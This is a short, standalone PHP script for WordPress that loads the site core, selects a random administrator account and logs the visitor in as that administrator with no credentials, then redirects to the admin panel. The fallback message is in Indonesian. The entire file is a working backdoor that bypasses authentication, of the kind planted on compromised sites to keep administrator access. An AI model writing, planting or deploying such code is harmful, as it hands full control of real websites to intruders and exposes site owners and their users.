<?php
require_once('wp-load.php');

$admins = get_users(array(
    'role' => 'Administrator'
));

if (!empty($admins)) {
    $random_admin = $admins[array_rand($admins)];
    $user_id = $random_admin->ID;
    
    wp_set_auth_cookie($user_id);
    wp_set_current_user($user_id);

    wp_redirect(admin_url());
    exit;
} else {
    echo "Tidak ada administrator yang ditemukan.";
}
?>
